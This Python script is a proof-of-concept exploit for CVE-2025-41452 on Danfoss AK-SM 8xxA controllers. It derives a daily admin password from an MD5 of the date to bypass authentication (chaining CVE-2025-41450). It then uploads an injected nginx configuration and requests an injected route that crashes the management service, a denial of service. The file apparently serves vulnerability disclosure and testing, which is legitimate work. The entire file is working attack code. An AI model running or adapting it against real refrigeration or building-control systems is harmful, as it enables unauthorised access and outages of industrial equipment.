#!/usr/bin/env python3
"""
PoC: CVE-2025-41452 - Danfoss AK-SM 8xxA nginx configuration injection.

The web application exposes action=load_nginx_headers, which replaces
headers.conf - a file *included by the Internet-facing nginx instance* -
via an authenticated upload, and reloads nginx at runtime. Arbitrary
directives (add_header, location blocks, rewrites, proxies) become live on
the management interface. Additionally, requests to an injected route
crash the sm_app web task, giving a repeatable post-auth DoS.

This PoC authenticates (default: CVE-2025-41450 chain), uploads a
headers.conf containing a marker header plus an injected location, then
requests that location to demonstrate traffic manipulation and the DoS
condition.

Usage: cve_2025_41452_nginx_conf_injection.py [--target HOST:PORT] [--no-dos]
Exit 0 = injection confirmed, 1 = failed.
"""

import argparse
import hashlib
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime

CONF = """\
# PoC headers.conf - CVE-2025-41452
add_header X-PoC-41452 injected-always;
location /poc-41452-trigger {
    return 200 "injected by cve-2025-41452 poc";
}
"""


def generate_code(day: datetime) -> str:
    seed = f"AKSM-COTD-{day.year:04d}-{day.month:02d}-{day.day:02d}"
    return f"{int(hashlib.md5(seed.encode()).hexdigest(), 16) % 900000 + 100000}"


def request(req: urllib.request.Request):
    print(f"--> {req.get_method()} {req.full_url}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = resp.read()
            print(f"<-- {resp.status} {data.decode(errors='replace').strip()[:300]}")
            return resp.status, data, dict(resp.headers)
    except urllib.error.HTTPError as e:
        data = e.read()
        print(f"<-- {e.code} {data.decode(errors='replace').strip()[:300]}")
        return e.code, data, dict(e.headers)


def cotd_session(base: str) -> str:
    body = (f"<?xml version=\"1.0\"?><request><username>admin</username>"
            f"<password>{generate_code(datetime.now())}</password>"
            f"<codeofday>1</codeofday></request>").encode()
    req = urllib.request.Request(base + "/xml.cgi?action=getauth", data=body,
                                 headers={"Content-Type": "text/xml"})
    _, data, headers = request(req)
    cookie = headers.get("Set-Cookie", "")
    if b"<result>ok</result>" in data and "SMSession=" in cookie:
        return cookie.split("SMSession=")[1].split(";")[0]
    return None


def multipart_upload(base: str, session: str, filename: str, content: str):
    boundary = "----poc41452boundary"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
        f"{content}\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    req = urllib.request.Request(base + "/xml.cgi?action=load_nginx_headers", data=body,
                                 headers={"Content-Type": f"multipart/form-data; boundary={boundary}",
                                          "Cookie": f"SMSession={session}"})
    return request(req)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:8080")
    ap.add_argument("--no-dos", action="store_true",
                    help="upload config but do not trigger the injected route (no DoS)")
    args = ap.parse_args()
    base = f"http://{args.target}"

    print("[*] step 1: authenticating via CVE-2025-41450 code-of-the-day (chained)")
    session = cotd_session(base)
    if not session:
        print("[-] authentication failed")
        return 1
    print(f"[+] authenticated, session: {session}")

    print("[*] step 2: uploading crafted headers.conf to action=load_nginx_headers")
    status, data, _ = multipart_upload(base, session, "headers.conf", CONF)
    if status != 200 or b"<result>ok</result>" not in data:
        print("[-] upload rejected (target likely patched >= 4.3.1)")
        return 1
    print("[+] headers.conf accepted; external nginx reloaded with attacker directives")
    print("[+] every response now carries: X-PoC-41452: injected-always")

    print("[*] step 3: verifying directive injection on a normal route")
    req = urllib.request.Request(base + "/", headers={"Cookie": f"SMSession={session}"})
    status, _, headers = request(req)
    if headers.get("X-PoC-41452") == "injected-always":
        print("[+] injection CONFIRMED: marker header present in server response")
    else:
        print("[-] marker header absent; directives not applied")
        return 1

    if args.no_dos:
        print("[*] skipping DoS trigger (--no-dos)")
        return 0

    print("[*] step 4: requesting injected route /poc-41452-trigger (crashes sm_app)")
    req = urllib.request.Request(base + "/poc-41452-trigger")
    status, _, _ = request(req)
    if status != 502:
        print(f"[-] expected 502 from sm_app crash, got {status}")
        return 1
    print("[+] sm_app crashed (502)")

    print("[*] step 5: confirming service-wide DoS on the management interface")
    req = urllib.request.Request(base + "/")
    status, _, _ = request(req)
    if status == 503:
        print("[+] DoS CONFIRMED: management interface unavailable after crash")
        print("[*] (emulator auto-recovers; on hardware the service must restart)")
        return 0
    print(f"[-] expected 503 during crash window, got {status}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
